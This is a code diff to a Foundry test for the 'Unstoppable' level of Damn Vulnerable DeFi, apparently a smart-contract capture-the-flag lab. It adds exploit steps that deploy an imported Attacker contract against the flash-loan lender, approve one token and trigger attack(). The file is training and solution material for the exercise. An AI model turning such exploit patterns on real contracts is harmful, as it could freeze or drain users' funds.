@@ -7,6 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
+import {Attacker} from "../../../src/Contracts/unstoppable/Attacker.sol";
 
 contract Unstoppable is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -60,6 +61,11 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        Attacker attackerContract = new Attacker(address(unstoppableLender), address(dvt));
+        dvt.approve(address(attackerContract), 1);
+        attackerContract.attack();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
